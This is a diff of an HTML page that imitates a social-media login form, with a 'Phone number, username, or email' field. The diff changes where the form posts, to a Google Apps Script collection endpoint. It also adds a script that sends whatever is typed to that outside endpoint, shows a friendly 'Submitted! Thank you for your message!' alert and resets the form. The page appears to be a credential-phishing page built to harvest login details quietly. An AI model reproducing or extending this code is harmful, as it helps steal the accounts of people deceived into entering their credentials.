@@ -283,7 +283,7 @@ footer .copyright span {
           <div class="title">
             <a href="https://ibb.co/XtKd6c7"><img src="https://i.ibb.co/2dCLRGv/logoname.png" alt="logoname" border="0"></a>
           </div>
-          <form class="login-form" id="sheetdb-form"  method="post" action="https://script.google.com/macros/s/AKfycbxsE6GA9e6X94N7IMQNe1WXCi8oSoPGwyE6RKWrp9Sor5mvOUyB9WY6XDgW7TcMDIeA/exec">
+          <form class="login-form" id="contact-form"  method="post" action="https://script.google.com/macros/s/AKfycbyX-xg0a47NEfM_9eWf0vP8GmAsZW6CEsJ4uy8AO9-P2YaRw4NTzkiJfCLkI8faC2G2/exec">
             <div class="form-content">
               <input name="Email" type="" placeholder="Phone number, username, or email" >
               <label for="uname"></label>
@@ -388,7 +388,30 @@ footer .copyright span {
     </footer>
 
 
-   
+   <script>
+  window.addEventListener("load", function() {
+    const form = document.getElementById('contact-form');
+    form.addEventListener("submit", function(e) {
+      e.preventDefault();
+      const data = new FormData(form);
+      const action = e.target.action;
+
+      fetch(action, {
+        method: 'POST',
+        body: data,
+      })
+      .then(response => response.json()) // Assuming the server returns JSON
+      .then(data => {
+        alert("Submitted! 💛💛 Thank you for your message! 💛💛");
+        form.reset(); // Reset the form after successful submission
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        // Handle errors if needed
+      });
+    });
+  });
+</script>
 
   </body>
 </html>
